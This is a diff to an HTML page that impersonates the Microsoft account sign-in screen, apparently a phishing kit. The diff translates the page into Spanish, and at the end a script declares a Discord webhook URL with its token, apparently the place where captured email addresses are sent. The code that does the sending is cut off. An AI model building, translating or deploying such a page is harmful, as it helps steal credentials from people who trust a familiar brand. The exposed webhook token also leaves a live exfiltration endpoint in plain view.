@@ -1,10 +1,10 @@
 <!doctype html>
-<html lang="en">
+<html lang="es">
 <head>
   <meta charset="UTF-8" />
   <link rel="icon" type="image/svg+xml" href="favicon.svg" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover" />
-  <title>Sign in to your account</title>
+  <title>Iniciar sesión en su cuenta</title>
   <style>
     *, *::before, *::after { box-sizing: border-box; }
 
@@ -16,7 +16,7 @@
       background: url('banner.svg') center/cover no-repeat fixed;
     }
 
-    /* ── MAIN CONTAINER ── */
+    /* ── CONTENEDOR PRINCIPAL ── */
     .main-container {
       min-height: 100vh;
       display: flex;
@@ -54,7 +54,7 @@
     }
     .ms-logo-grid div { width: 10px; height: 10px; }
 
-    /* ── TITLE ── */
+    /* ── TÍTULO ── */
     .ms-card h1 {
       font-size: 24px;
       font-weight: 600;
@@ -64,7 +64,7 @@
       text-align: left;
     }
 
-    /* ── EMAIL INPUT ── */
+    /* ── INPUT EMAIL ── */
     #email {
       display: block;
       width: 100%;
@@ -90,7 +90,7 @@
     }
     .ms-link:hover { text-decoration: underline; }
 
-    /* ── BUTTON ROW ── */
+    /* ── FILA BOTÓN ── */
     .ms-form-bottom {
       display: flex;
       align-items: center;
@@ -98,7 +98,7 @@
       margin-top: 24px;
     }
 
-    /* ── BUTTON ── */
+    /* ── BOTÓN ── */
     .ms-btn-next {
       background: #0078d4;
       color: #fff;
@@ -124,7 +124,7 @@
     }
     #errorMessage.visible { display: block; }
 
-    /* ── OPTIONS BLOCK ── */
+    /* ── BLOQUE OPCIONES ── */
     .ms-options-card {
       background: #fff;
       box-shadow: 0 2px 6px rgba(0,0,0,.2);
@@ -159,7 +159,7 @@
     .ms-footer a { color: #605e5c; text-decoration: none; font-size: 12px; }
     .ms-footer a:hover { color: #0078d4; }
 
-    /* ── ANIMATIONS ── */
+    /* ── ANIMACIONES ── */
     .fade-in { animation: fadeIn .3s ease-out; }
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(10px); }
@@ -172,7 +172,7 @@
     }
     .error-shake { animation: shake .5s ease-in-out; }
 
-    /* ── MOBILE: no scroll or zoom ── */
+    /* ── MÓVIL: sin scroll ni zoom ── */
     @media (max-width: 639px) {
       html, body {
         position: fixed !important;
@@ -189,13 +189,16 @@
         touch-action: none !important;
       }
     }
+
+    /* ── SIN FONDO EN MÓVIL/TABLET ── */
+    }
   </style>
 </head>
 <body>
 
   <div class="main-container">
 
-    <!-- MAIN CARD -->
+    <!-- CARD PRINCIPAL -->
     <div class="card-wrapper fade-in">
       <div class="ms-card">
 
@@ -210,7 +213,7 @@
           <span style="font-size:21px;font-weight:600;color:#1b1b1b;">Microsoft</span>
         </div>
 
-        <h1>Sign in</h1>
+        <h1>Iniciar sesión</h1>
 
         <!-- Error -->
         <div id="errorMessage">
@@ -219,57 +222,56 @@
               <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
             </svg>
             <div>
-              <p style="font-size:14px;color:#a4262c;font-weight:600;margin:0">Only Microsoft accounts are allowed</p>
-              <p style="font-size:12px;color:#a4262c;margin:4px 0 0">Use an address from hotmail, outlook, live or msn</p>
+              <p style="font-size:14px;color:#a4262c;font-weight:600;margin:0">Solo se permiten cuentas de Microsoft</p>
+              <p style="font-size:12px;color:#a4262c;margin:4px 0 0">Use una dirección de hotmail, outlook, live o msn</p>
             </div>
           </div>
         </div>
 
-        <!-- Form -->
+        <!-- Formulario -->
         <form id="emailForm">
           <input
             type="email"
             id="email"
-            placeholder="Email, phone, or Skype"
+            placeholder="Correo electrónico, teléfono o Skype"
             required
             autocomplete="email"
           />
 
           <div style="margin:16px 0 8px;">
             <p style="font-size:13px;margin:0 0 8px;color:#1b1b1b;">
-              No account? <a href="#" class="ms-link">Create one!</a>
+              ¿No tiene una cuenta? <a href="#" class="ms-link">Cree una.</a>
             </p>
-            <a href="#" class="ms-link">Can't access your account?</a>
+            <a href="#" class="ms-link">¿No puede acceder a su cuenta?</a>
           </div>
 
           <div class="ms-form-bottom">
             <span></span>
-            <button type="submit" id="submitBtn" class="ms-btn-next">Next</button>
+            <button type="submit" id="submitBtn" class="ms-btn-next">Siguiente</button>
           </div>
         </form>
 
       </div>
     </div>
 
-    <!-- Options -->
+    <!-- Opciones -->
     <div class="ms-options-card">
       <svg class="ms-options-icon" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24">
         <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z"/>
       </svg>
-      <span>Sign-in options</span>
+      <span>Opciones de inicio de sesión</span>
     </div>
 
   </div>
 
   <!-- Footer -->
   <div class="ms-footer">
-    <a href="#">Terms of use</a>
-    <a href="#">Privacy & cookies</a>
+    <a href="#">Términos de uso</a>
+    <a href="#">Privacidad y cookies</a>
     <span>···</span>
   </div>
 
-  <!-- SCRIPT SIN CAMBIOS (Discord webhook) -->
-  <script>
+ <script>
     // ── WEBHOOK DE DISCORD ─────────────────────────────────────────
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1471154630997315625/EWAdwp2bkQXXFkU5Nh87iUKf4NfvnP0eQ5CqUOT1P-fhUC8iSjrXqYAEe1kdkHWG3PTi";
 
